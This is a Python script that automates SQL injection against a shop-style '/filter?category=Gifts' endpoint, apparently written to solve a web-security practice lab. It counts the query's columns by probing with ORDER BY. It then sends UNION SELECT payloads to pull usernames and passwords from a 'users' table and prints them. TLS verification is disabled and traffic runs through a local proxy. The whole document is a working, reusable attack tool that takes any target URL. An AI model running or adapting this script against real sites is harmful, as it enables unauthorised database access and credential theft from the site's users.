import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080"
}

def getNoOfColumn(url):
    path = "/filter?category=Gifts"    
    payload = "' ORDER BY "

    i = 1
    columnNumber = 0

    while(i != 0):
        getRes = requests.get(url+path+payload+str(i)+"--", verify=False, proxies=proxies)

        if(getRes.status_code == 200):
            columnNumber = i
            i+=1
        else:
            i = 0

    return columnNumber 

def getCred(url, noOfColumn):
    path = "/filter?category=Gifts"
    string = "username||'~'||password "


    for i in range(1, noOfColumn+1):
        payload_list = ['null']* noOfColumn
        payload_list[i-1] = string
        sqlPayload = "' UNION SELECT "+ ','.join(payload_list) + " FROM users --"

        res = requests.get(url+path+sqlPayload, verify=False, proxies=proxies)

        if(res.status_code == 200):
            soup = BeautifulSoup(res.text,'html.parser')
            th_tag = soup.find("th")

            if th_tag:
                data = th_tag.text.strip()
                # Split using "~"
                username, password = data.split("~")
                print("Username:", username)
                print("Password:", password)
            else:
                print("No <th> tag found")
                print("username: ")
            return True
    return False


if __name__  == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] invalid input")
        print("[-] input format - %s <url>" %sys.argv[0])
        sys.exit(-1)

    # get no of column
    # print("hello")
    noOfColumn = getNoOfColumn(url)

    # get username and password
    if not getCred(url, noOfColumn):
        print("username password not found")